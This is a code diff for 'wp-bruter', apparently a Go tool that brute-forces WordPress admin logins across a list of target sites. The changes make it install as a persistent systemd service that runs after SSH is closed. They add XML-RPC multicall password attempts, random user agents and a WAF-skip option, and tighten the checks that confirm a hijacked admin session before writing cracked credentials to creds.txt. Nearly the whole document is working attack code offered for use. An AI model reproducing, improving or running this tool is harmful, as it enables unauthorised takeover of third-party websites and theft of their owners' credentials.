@@ -334,22 +334,20 @@ const workersPerSite = 10
 func main() {
 	flag.Parse()
 
-	if wantsSupervisor(flag.Args()) {
-		runSupervised()
-		return
-	}
-
-	if wantsSupervisor(flag.Args()) {
-		runSupervised()
-		return
-	}
-
+	// Explicit lifecycle flags win over the supervisor: `--install` on a box
+	// without a list yet must still install, and `--uninstall` must not start
+	// a sweep first.
 	if *uninstall {
 		runUninstall()
 		return
 	}
 	if *installFlag {
 		runInstall()
+		return
+	}
+
+	if wantsSupervisor(flag.Args()) {
+		runSupervised()
 		return
 	}
 
@@ -845,14 +843,14 @@ StartLimitBurst=100
 
 [Service]
 Type=simple
-WorkingDirectory=/opt/wp-bruter
-EnvironmentFile=-/opt/wp-bruter/config.env
-ExecStart=/opt/wp-bruter/wp-bruter \
+WorkingDirectory=%[1]s
+EnvironmentFile=-%[1]s/config.env
+ExecStart=%[1]s/wp-bruter \
     -auto \
-    -sites ${SITES_FILE} \
-    -passlist ${PASS_FILE} \
-    -output ${OUTPUT_FILE} \
-    -progress ${PROGRESS_FILE} \
+    -sites %[1]s/wordpress.txt \
+    -passlist %[1]s/pass.txt \
+    -output %[1]s/results.txt \
+    -progress %[1]s/progress.txt \
     $EXTRA_ARGS
 
 Restart=on-failure
@@ -870,12 +868,118 @@ SyslogIdentifier=wp-bruter
 WantedBy=multi-user.target
 `
 
-const defaultConfigEnv = `SITES_FILE=/opt/wp-bruter/wordpress.txt
-PASS_FILE=/opt/wp-bruter/pass.txt
-OUTPUT_FILE=/opt/wp-bruter/results.txt
-PROGRESS_FILE=/opt/wp-bruter/progress.txt
+// The unit carries concrete paths, so config.env is only for extra flags and
+// can never leave systemd passing an empty -sites argument.
+const defaultConfigEnv = `# Extra flags appended to ExecStart, e.g.: -skip-waf -timeout 8
 EXTRA_ARGS=
 `
+
+// copyFileAtomic writes src beside dst and renames it into place, so a reader
+// never sees a half-written file.
+func copyFileAtomic(src, dst string, mode os.FileMode) error {
+	data, err := os.ReadFile(src)
+	if err != nil {
+		return err
+	}
+	tmp := dst + ".new"
+	if err := os.WriteFile(tmp, data, mode); err != nil {
+		return err
+	}
+	return os.Rename(tmp, dst)
+}
+
+// establishInstall makes the install self-contained: binary, target list,
+// password list and unit all get real files under installDir. A later run from
+// /root (or a reboot) can therefore never break a working service.
+func establishInstall(self, sites string) error {
+	if err := os.MkdirAll(installDir, 0o755); err != nil {
+		return err
+	}
+
+	dst := filepath.Join(installDir, "wp-bruter")
+	if self != dst {
+		if err := copyFileAtomic(self, dst, 0o755); err != nil {
+			return fmt.Errorf("install binary: %w", err)
+		}
+		fmt.Printf("✓ binary → %s\n", dst)
+	} else {
+		fmt.Println("✓ binary already in place")
+	}
+
+	sitesDst := filepath.Join(installDir, "wordpress.txt")
+	if sites != sitesDst {
+		if err := copyFileAtomic(sites, sitesDst, 0o600); err != nil {
+			return fmt.Errorf("install target list: %w", err)
+		}
+		fmt.Printf("✓ target list → %s\n", sitesDst)
+	}
+
+	// Password list: an explicit -passlist wins, otherwise take the one next
+	// to the binary. Missing is not fatal — the child downloads it at runtime.
+	passDst := filepath.Join(installDir, "pass.txt")
+	switch {
+	case flagSet("passlist") && *passListFile != passDst:
+		if err := copyFileAtomic(*passListFile, passDst, 0o600); err != nil {
+			return fmt.Errorf("install password list: %w", err)
+		}
+		fmt.Printf("✓ password list → %s\n", passDst)
+	case !fileExists(passDst):
+		src := filepath.Join(filepath.Dir(self), "pass.txt")
+		if src != passDst && copyFileAtomic(src, passDst, 0o600) == nil {
+			fmt.Printf("✓ password list → %s\n", passDst)
+		}
+	}
+
+	cfgPath := filepath.Join(installDir, "config.env")
+	cfg := defaultConfigEnv
+	if existing, err := os.ReadFile(cfgPath); err == nil {
+		// Older installs used these path vars; the unit now carries concrete
+		// paths, so keep only the operator's EXTRA_ARGS.
+		for _, line := range strings.Split(string(existing), "\n") {
+			trim := strings.TrimSpace(line)
+			if strings.HasPrefix(trim, "EXTRA_ARGS=") {
+				cfg = "# Extra flags appended to ExecStart, e.g.: -skip-waf -timeout 8\n" + trim + "\n"
+				break
+			}
+		}
+	}
+	if err := os.WriteFile(cfgPath, []byte(cfg), 0o600); err != nil {
+		return fmt.Errorf("write config: %w", err)
+	}
+
+	if err := os.WriteFile(servicePath, []byte(fmt.Sprintf(serviceFile, installDir)), 0o644); err != nil {
+		return fmt.Errorf("write unit: %w", err)
+	}
+	fmt.Printf("✓ %s\n", servicePath)
+	return nil
+}
+
+func fileExists(path string) bool {
+	_, err := os.Stat(path)
+	return err == nil
+}
+
+// startService reloads, enables and restarts the unit, then proves it is
+// actually active instead of claiming success blindly.
+func startService() error {
+	exec.Command("systemctl", "daemon-reload").Run()
+	if out, err := exec.Command("systemctl", "enable", "wp-bruter.service").CombinedOutput(); err != nil {
+		return fmt.Errorf("systemctl enable failed: %v: %s", err, strings.TrimSpace(string(out)))
+	}
+	if out, err := exec.Command("systemctl", "restart", "wp-bruter.service").CombinedOutput(); err != nil {
+		return fmt.Errorf("systemctl restart failed: %v: %s", err, strings.TrimSpace(string(out)))
+	}
+	deadline := time.Now().Add(8 * time.Second)
+	for time.Now().Before(deadline) {
+		out, err := exec.Command("systemctl", "is-active", "wp-bruter.service").Output()
+		if err == nil && strings.TrimSpace(string(out)) == "active" {
+			return nil
+		}
+		time.Sleep(400 * time.Millisecond)
+	}
+	logs, _ := exec.Command("journalctl", "-u", "wp-bruter.service", "-n", "20", "--no-pager").CombinedOutput()
+	return fmt.Errorf("service did not stay active\n%s", strings.TrimSpace(string(logs)))
+}
 
 func runInstall() {
 	// Must be root
@@ -890,100 +994,47 @@ func runInstall() {
 		fmt.Fprintf(os.Stderr, "cannot find own binary: %v\n", err)
 		os.Exit(1)
 	}
-	selfDir := filepath.Dir(self)
 
-	fmt.Println("=== wp-bruter install ===")
-
-	// Create install dir
-	os.MkdirAll(installDir, 0o755)
-
-	// Copy binary
-	dst := installDir + "/wp-bruter"
-	if self != dst {
-		src, err := os.ReadFile(self)
-		if err != nil {
-			fmt.Fprintf(os.Stderr, "read binary: %v\n", err)
-			os.Exit(1)
-		}
-		// Rename over the destination: a running binary cannot be truncated
-		// in place (ETXTBSY), and a rename is atomic.
-		tmp := dst + ".new"
-		if err := os.WriteFile(tmp, src, 0o755); err != nil {
-			fmt.Fprintf(os.Stderr, "write binary: %v\n", err)
-			os.Exit(1)
-		}
-		if err := os.Rename(tmp, dst); err != nil {
-			fmt.Fprintf(os.Stderr, "replace binary: %v\n", err)
-			os.Exit(1)
-		}
-		fmt.Printf("✓ binary → %s\n", dst)
-	} else {
-		fmt.Println("✓ binary already in place")
-	}
-
-	// Copy wordlists from same dir as binary (don't overwrite existing)
-	for _, name := range []string{"pass.txt", "wordpress.txt"} {
-		src := selfDir + "/" + name
-		dst := installDir + "/" + name
-		if _, err := os.Stat(dst); err == nil {
-			fmt.Printf("✓ keeping existing %s\n", dst)
-			continue
-		}
-		if data, err := os.ReadFile(src); err == nil {
-			os.WriteFile(dst, data, 0o600)
-			fmt.Printf("✓ %s → %s\n", name, dst)
-		}
-	}
-
-	// Config env
-	cfgPath := installDir + "/config.env"
-	if _, err := os.Stat(cfgPath); err != nil {
-		os.WriteFile(cfgPath, []byte(defaultConfigEnv), 0o600)
-		fmt.Printf("✓ created %s\n", cfgPath)
-	} else {
-		fmt.Printf("✓ keeping existing %s\n", cfgPath)
-	}
-
-	// Systemd service
-	svcPath := "/etc/systemd/system/wp-bruter.service"
-	if err := os.WriteFile(svcPath, []byte(serviceFile), 0o644); err != nil {
-		fmt.Fprintf(os.Stderr, "write service: %v\n", err)
+	sites, err := resolveList()
+	if err != nil {
+		fmt.Fprintf(os.Stderr, "✗ %v\n", err)
+		fmt.Fprintln(os.Stderr, "  drop wordpress.txt beside the binary or in /root, or pass -sites")
 		os.Exit(1)
 	}
-	fmt.Printf("✓ %s\n", svcPath)
+	if sites, err = filepath.Abs(sites); err != nil {
+		fmt.Fprintf(os.Stderr, "cannot resolve list path: %v\n", err)
+		os.Exit(1)
+	}
 
-	// Reload + enable
-	exec.Command("systemctl", "daemon-reload").Run()
-	exec.Command("systemctl", "enable", "wp-bruter").Run()
-	fmt.Println("✓ service enabled")
+	fmt.Println("=== wp-bruter install ===")
+	if err := establishInstall(self, sites); err != nil {
+		fmt.Fprintf(os.Stderr, "✗ %v\n", err)
+		os.Exit(1)
+	}
+	if err := startService(); err != nil {
+		fmt.Fprintf(os.Stderr, "✗ %v\n", err)
+		os.Exit(1)
+	}
 
 	// Verify
 	fmt.Println("")
-	if info, err := os.Stat(installDir + "/wordpress.txt"); err == nil && info.Size() > 0 {
-		data, _ := os.ReadFile(installDir + "/wordpress.txt")
-		lines := len(strings.Split(strings.TrimSpace(string(data)), "\n"))
-		fmt.Printf("✓ %d sites in wordpress.txt\n", lines)
-	} else {
-		fmt.Println("⚠ wordpress.txt empty — add targets before starting")
+	fmt.Println("✓ service active — SSH may be closed now")
+	if data, err := os.ReadFile(filepath.Join(installDir, "wordpress.txt")); err == nil {
+		fmt.Printf("  %d sites queued\n", len(strings.Split(strings.TrimSpace(string(data)), "\n")))
 	}
-	if info, err := os.Stat(installDir + "/pass.txt"); err == nil && info.Size() > 0 {
-		data, _ := os.ReadFile(installDir + "/pass.txt")
-		lines := len(strings.Split(strings.TrimSpace(string(data)), "\n"))
-		fmt.Printf("✓ %d passwords in pass.txt\n", lines)
+	if data, err := os.ReadFile(filepath.Join(installDir, "pass.txt")); err == nil {
+		fmt.Printf("  %d passwords\n", len(strings.Split(strings.TrimSpace(string(data)), "\n")))
 	} else {
-		fmt.Println("⚠ pass.txt empty — add passwords before starting")
+		fmt.Println("  ⚠ no pass.txt — it will be downloaded on first start")
 	}
-
 	fmt.Println("")
-	fmt.Println("  systemctl start wp-bruter       # start")
+	fmt.Printf("  %s    # creds, growing as sites are hit\n", filepath.Join(installDir, "creds.txt"))
+	fmt.Println("  journalctl -u wp-bruter -f      # live log")
 	fmt.Println("  systemctl stop wp-bruter        # stop")
-	fmt.Println("  journalctl -u wp-bruter -f      # live logs")
-	fmt.Println("  cat /opt/wp-bruter/results.txt  # found creds")
-	fmt.Println("  cat /opt/wp-bruter/creds.txt    # same, machine-readable")
 	fmt.Println("")
-	fmt.Println("  nano /opt/wp-bruter/config.env      # edit flags")
-	fmt.Println("  nano /opt/wp-bruter/wordpress.txt   # edit targets")
-	fmt.Println("  rm /opt/wp-bruter/progress.txt && systemctl restart wp-bruter  # fresh start")
+	fmt.Printf("  nano %s   # extra flags\n", filepath.Join(installDir, "config.env"))
+	fmt.Printf("  nano %s  # targets\n", filepath.Join(installDir, "wordpress.txt"))
+	fmt.Printf("  rm %s && systemctl restart wp-bruter  # fresh start\n", filepath.Join(installDir, "progress.txt"))
 }
 
 func runUninstall() {
@@ -1187,6 +1238,18 @@ const (
 	outProtocol // transport fine, protocol unusable (xmlrpc off, garbage)
 )
 
+// mayProcess reports whether a queued attempt still deserves a request. A
+// job that stopped because it hit its attempt budget has already handed its
+// last batch to the queue — dropping those would waste the tail of every
+// phase. Every other stop (cracked, blocked, network, cancelled) means skip.
+func mayProcess(j *SiteJob) bool {
+	if !j.stopped.Load() {
+		return true
+	}
+	r, _ := j.reason.Load().(string)
+	return r == "attempt_limit"
+}
+
 func processAttempt(a *Attempt) {
 	if len(a.Creds) > 1 {
 		processMulticall(a)
@@ -1195,7 +1258,7 @@ func processAttempt(a *Attempt) {
 	j := a.Job
 	defer j.inflight.Add(-1)
 
-	if j.stopped.Load() {
+	if !mayProcess(j) {
 		return
 	}
 
@@ -1229,7 +1292,7 @@ func processMulticall(a *Attempt) {
 	creds := a.Creds
 	defer j.inflight.Add(-int64(len(creds)))
 
-	if j.stopped.Load() {
+	if !mayProcess(j) {
 		return
 	}
 	if !j.xmlrpc.Load() {
@@ -1552,16 +1615,12 @@ func tryLogin(j *SiteJob, user, pass string) (loginOutcome, string) {
 	// cookie; a redirect target alone can be faked by a WAF or plugin, so the
 	// cookie is the authoritative signal and is checked first.
 	adminRedirect := (status == fasthttp.StatusFound || status == fasthttp.StatusSeeOther) &&
-		strings.Contains(location, "wp-admin") && !strings.Contains(location, "wp-login")
+		adminPath(location)
 
 	if hasAuthCookie(resp) {
 		// A live cookie is the strongest signal, but some plugins hand one out
 		// on a bounced session, so confirm that it opens wp-admin.
-		adminURL := location
-		if !adminRedirect {
-			adminURL = strings.TrimRight(j.Site, "/") + "/wp-admin/"
-		}
-		if verifyAdmin(j.Site, adminURL, resp) {
+		if verifyAdmin(j.Site, resp) {
 			diagLog("SUCCESS", j.Site, fmt.Sprintf("%s:%s - wordpress_logged_in cookie", user, pass))
 			return outSuccess, ""
 		}
@@ -1572,7 +1631,7 @@ func tryLogin(j *SiteJob, user, pass string) (loginOutcome, string) {
 	// No cookie but a redirect into wp-admin: require admin content before
 	// believing it.
 	if adminRedirect {
-		if verifyAdmin(j.Site, location, resp) {
+		if verifyAdmin(j.Site, resp) {
 			return outSuccess, ""
 		}
 		if *debugFlag {
@@ -1585,24 +1644,15 @@ func tryLogin(j *SiteJob, user, pass string) (loginOutcome, string) {
 	// Last resort: some plugins and custom login forms answer 200 with the
 	// dashboard in the same response instead of redirecting. Require the
 	// response to not be the login form itself, otherwise any themed login
-	// page containing the word "Dashboard" counts as a valid session.
+	// page containing wp-admin assets counts as a valid session.
 	if status == fasthttp.StatusOK {
 		body := resp.Body()
 		// The password field must be searched in the WHOLE body: themed login
 		// pages can be >100 KB, with the form far beyond any cheap sample.
-		hasPwd := bytes.Contains(body, []byte(`name="pwd"`)) ||
-			bytes.Contains(body, []byte("name='pwd'")) ||
-			bytes.Contains(body, []byte("name=pwd"))
-		if !hasPwd && len(body) > 0 {
-			sample := strings.ToLower(string(body[:min(len(body), 32768)]))
-			for _, sig := range []string{
-				"adminmenu", "wpbody-content", "wp-heading-inline",
-				"wp-toolbar", "screen-meta", `id="admin-bar"`, `class="admin-bar`,
-			} {
-				if strings.Contains(sample, sig) {
-					diagLog("SUCCESS", j.Site, fmt.Sprintf("%s:%s - admin page detected (200)", user, pass))
-					return outSuccess, ""
-				}
+		if !hasPasswordField(body) && len(body) > 0 {
+			if hasAdminMarkers(body) {
+				diagLog("SUCCESS", j.Site, fmt.Sprintf("%s:%s - admin page detected (200)", user, pass))
+				return outSuccess, ""
 			}
 		}
 	}
@@ -1662,25 +1712,56 @@ func hasAuthCookie(resp *fasthttp.Response) bool {
 	return found
 }
 
-// verifyAdmin follows the wp-admin redirect with session cookies from the
-// login response and checks that the target actually serves admin content.
-// Catches false-positive 302s and confirms real sessions.
-func verifyAdmin(site, location string, loginResp *fasthttp.Response) bool {
-	req := fasthttp.AcquireRequest()
-	resp := fasthttp.AcquireResponse()
-	defer fasthttp.ReleaseRequest(req)
-	defer fasthttp.ReleaseResponse(resp)
-
-	adminURL := location
-	if !strings.HasPrefix(adminURL, "http") {
-		adminURL = strings.TrimRight(site, "/") + "/" + strings.TrimLeft(location, "/")
+// adminPath reports whether a URL really points into wp-admin. Membership in
+// the query string is not enough: a custom login plugin answers a failed login
+// with /login/?redirect_to=.../wp-admin/ and the path is still /login/.
+func adminPath(raw string) bool {
+	u, err := url.Parse(raw)
+	if err != nil {
+		return false
 	}
+	return strings.HasPrefix(u.Path, "/wp-admin") && !strings.Contains(u.Path, "wp-login")
+}
 
-	req.SetRequestURI(adminURL)
-	req.Header.SetMethod("GET")
-	req.Header.Set("User-Agent", randomUA())
+// resolveURL resolves a possibly relative Location header against base.
+func resolveURL(base, loc string) string {
+	b, err := url.Parse(base)
+	if err != nil {
+		return loc
+	}
+	r, err := url.Parse(loc)
+	if err != nil {
+		return loc
+	}
+	return b.ResolveReference(r).String()
+}
 
-	// Forward auth cookies from the login response.
+// hasPasswordField is true for any page carrying the login form. wp-admin
+// pages never have a "pwd" field (profile.php uses pass1/pass2), while every
+// login screen — core or plugin — does.
+func hasPasswordField(body []byte) bool {
+	return bytes.Contains(body, []byte(`name="pwd"`)) ||
+		bytes.Contains(body, []byte("name='pwd'")) ||
+		bytes.Contains(body, []byte("name=pwd"))
+}
+
+// hasAdminMarkers requires markup that only real wp-admin pages carry. The weak
+// signals (wpadminbar, admin-bar, dashboard) also appear on login pages because
+// the login form loads core admin CSS.
+func hasAdminMarkers(body []byte) bool {
+	sample := strings.ToLower(string(body[:min(len(body), 32768)]))
+	for _, sig := range []string{"adminmenu", "wpbody-content", "wp-heading-inline"} {
+		if strings.Contains(sample, sig) {
+			return true
+		}
+	}
+	return false
+}
+
+// verifyAdmin requests /wp-admin/ with the session cookies from the login
+// response and follows at most a few in-admin redirects. A session only counts
+// when the landing page is admin markup with no login form.
+func verifyAdmin(site string, loginResp *fasthttp.Response) bool {
 	cookies := []string{"wordpress_test_cookie=WP+Cookie+check"}
 	loginResp.Header.VisitAll(func(key, value []byte) {
 		if strings.EqualFold(string(key), "Set-Cookie") {
@@ -1692,49 +1773,50 @@ func verifyAdmin(site, location string, loginResp *fasthttp.Response) bool {
 			}
 		}
 	})
-	req.Header.Set("Cookie", strings.Join(cookies, "; "))
 
-	err := httpClient.DoTimeout(req, resp, time.Duration(*timeoutSec)*time.Second)
-	stats.requests.Add(1)
-	if err != nil {
-		// Network hiccup on verify — cannot confirm the session is real.
-		// A 302 alone is not proof; return false to avoid false positives.
-		return false
-	}
+	adminURL := strings.TrimRight(site, "/") + "/wp-admin/"
+	for hop := 0; hop < 4; hop++ {
+		req := fasthttp.AcquireRequest()
+		resp := fasthttp.AcquireResponse()
 
-	// Redirected back to the login page → session is invalid.
-	loc := string(resp.Header.Peek("Location"))
-	if strings.Contains(loc, "wp-login") {
-		return false
-	}
+		req.SetRequestURI(adminURL)
+		req.Header.SetMethod("GET")
+		req.Header.Set("User-Agent", randomUA())
+		req.Header.Set("Cookie", strings.Join(cookies, "; "))
 
-	// Still within the admin area (e.g. /wp-admin/ → /wp-admin/index.php).
-	// That alone is not proof, so only trust it on another redirect; otherwise
-	// fall through to the body check.
-	if strings.Contains(loc, "wp-admin") && resp.StatusCode() >= 300 && resp.StatusCode() < 400 {
-		return true
-	}
-
-	// 403/404 → the redirect was bogus.
-	if resp.StatusCode() == fasthttp.StatusForbidden || resp.StatusCode() == fasthttp.StatusNotFound {
-		return false
-	}
-
-	// Check response body for admin page indicators.
-	body := resp.Body()
-	if len(body) > 0 {
-		sample := strings.ToLower(string(body[:min(len(body), 32768)]))
-		for _, sig := range []string{
-			"dashboard", "adminmenu", "wpadminbar",
-			"screen-meta", "wpbody-content", "wp-toolbar",
-			"admin-bar", "wp-heading-inline",
-		} {
-			if strings.Contains(sample, sig) {
-				return true
-			}
+		err := httpClient.DoTimeout(req, resp, time.Duration(*timeoutSec)*time.Second)
+		stats.requests.Add(1)
+		if err != nil {
+			// Network hiccup on verify — cannot confirm the session is real.
+			fasthttp.ReleaseRequest(req)
+			fasthttp.ReleaseResponse(resp)
+			return false
 		}
-	}
 
+		status := resp.StatusCode()
+		loc := string(resp.Header.Peek("Location"))
+		body := resp.Body()
+
+		// Any redirect that leaves wp-admin (wp-login.php, a custom /login/
+		// handler, the front page) means the session is not authenticated.
+		if status >= 300 && status < 400 && loc != "" {
+			next := resolveURL(adminURL, loc)
+			if !adminPath(next) {
+				fasthttp.ReleaseRequest(req)
+				fasthttp.ReleaseResponse(resp)
+				return false
+			}
+			adminURL = next
+			fasthttp.ReleaseRequest(req)
+			fasthttp.ReleaseResponse(resp)
+			continue
+		}
+
+		ok := status == fasthttp.StatusOK && !hasPasswordField(body) && hasAdminMarkers(body)
+		fasthttp.ReleaseRequest(req)
+		fasthttp.ReleaseResponse(resp)
+		return ok
+	}
 	return false
 }
 
